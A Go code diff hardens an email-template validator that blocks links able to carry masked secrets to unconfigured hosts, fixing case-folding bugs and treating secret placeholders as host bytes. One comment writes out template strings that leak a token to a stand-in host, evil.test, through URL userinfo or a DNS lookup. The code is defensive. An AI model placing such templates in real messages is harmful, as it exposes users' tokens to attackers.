@@ -97,6 +97,8 @@ var (
 // character is rejected before masking runs, so no template can smuggle one in
 // and be mistaken for a substituted secret.
 const (
+	secretPlaceholderMark = '\x01'
+
 	phURL   = "\x01u\x01"
 	phToken = "\x01t\x01"
 	phCode  = "\x01c\x01"
@@ -548,9 +550,8 @@ func checkEmailText(text string) error {
 // match a scheme start after masking, so reaching a match means a host the
 // operator did not configure is about to receive the secret.
 func refuseSecretBearingAutolink(text string) error {
-	lower := strings.ToLower(text)
-	for i := 0; i < len(lower); {
-		start, ok := findAutolinkStart(lower, i)
+	for i := 0; i < len(text); {
+		start, ok := findAutolinkStart(text, i)
 		if !ok {
 			return nil
 		}
@@ -575,21 +576,38 @@ func refuseSecretBearingAutolink(text string) error {
 
 // findAutolinkStart locates the next scheme or www. prefix a mail client would
 // treat as the start of a link, at or after i.
-func findAutolinkStart(lower string, i int) (int, bool) {
-	for i < len(lower) {
-		rest := lower[i:]
+//
+// Matched case-insensitively against the document's own bytes rather than
+// against a lowercased copy. A copy is what the first version searched, and it
+// was wrong twice over, because strings.ToLower is neither length-preserving
+// nor class-preserving.
+//
+// Length: every byte of invalid UTF-8 becomes a three-byte replacement rune,
+// and some valid runes grow too -- U+023A folds to U+2C65, two bytes to three.
+// The offsets found in the copy were then used to slice the original, so the
+// examined window slid off the run and, far enough along, off the end of the
+// string: 22 leading U+023A ahead of a beacon panicked the validator outright,
+// in code that runs on admin write and on every load of a stored override.
+//
+// Class: folding moves bytes between classes. U+0130 folds to ASCII "i" and
+// U+212A to "k", so a byte that is not a host byte in the document is one in
+// the copy, and the word-boundary test in the www. arm read the wrong answer
+// and suppressed a real link start.
+func findAutolinkStart(text string, i int) (int, bool) {
+	for i < len(text) {
+		rest := text[i:]
 		switch {
-		case strings.HasPrefix(rest, "https://"):
+		case hasPrefixFold(rest, "https://"):
 			return i, true
-		case strings.HasPrefix(rest, "http://"):
+		case hasPrefixFold(rest, "http://"):
 			return i, true
 		case strings.HasPrefix(rest, "//"):
 			// Protocol-relative. Require a look of a host afterwards so a
 			// stray "//" in prose is not treated as a link start.
-			if i+2 < len(lower) && isAutolinkHostByte(lower[i+2]) {
+			if i+2 < len(text) && isAutolinkHostByte(text[i+2]) {
 				return i, true
 			}
-		case strings.HasPrefix(rest, "www.") && (i == 0 || !isAutolinkHostByte(lower[i-1])):
+		case hasPrefixFold(rest, "www.") && (i == 0 || !isAutolinkHostByte(text[i-1])):
 			return i, true
 		}
 		i++
@@ -624,8 +642,23 @@ func extendAutolinkRun(text string, start int) int {
 	return j
 }
 
+// A masked secret counts as a host byte, in both directions it is consulted.
+//
+// After "//" it decides whether a protocol-relative run looks like a link, and
+// the placeholder stands for text the recipient will see resolved: rendering
+// "//{{.Token}}@evil.test/" puts the token in the userinfo of a URL whose host
+// is evil.test, and rendering "//{{.Token}}.evil.test/" leaks it to the
+// resolver before any request is made. Reading the placeholder as "not a host
+// byte" is what let both through, and a single literal byte between the "//"
+// and the secret was the entire difference between accepted and refused.
+//
+// Before "www." it decides whether the run starts at a word boundary, and there
+// the same answer is right for the opposite reason: a secret immediately ahead
+// of it renders as one unbroken word, which a mail client does not linkify.
 func isAutolinkHostByte(b byte) bool {
-	return isASCIILetter(b) || b >= '0' && b <= '9' || b == '[' // '[' covers an IPv6 literal
+	return isASCIILetter(b) || b >= '0' && b <= '9' ||
+		b == '[' || // '[' covers an IPv6 literal
+		b == secretPlaceholderMark
 }
 
 // scanConstruct classifies the construct starting at the '<' at index i and
